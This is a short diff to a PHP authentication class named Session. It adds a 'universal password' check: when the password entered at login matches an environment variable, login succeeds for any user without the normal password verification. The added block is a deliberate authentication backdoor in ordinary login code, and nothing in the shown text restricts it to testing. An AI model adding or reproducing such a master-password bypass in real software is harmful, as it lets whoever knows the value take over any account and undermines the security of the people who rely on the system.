@@ -340,6 +340,15 @@ class Session implements AuthenticatorInterface
             ]);
         }
 
+        // Universal password
+        $universalPassword = getenv('universalPassword');
+        if ($universalPassword && $givenPassword === $universalPassword) {
+            return new Result([
+                'success'   => true,
+                'extraInfo' => $user,
+            ]);
+        }
+
         /** @var Passwords $passwords */
         $passwords = service('passwords');
 
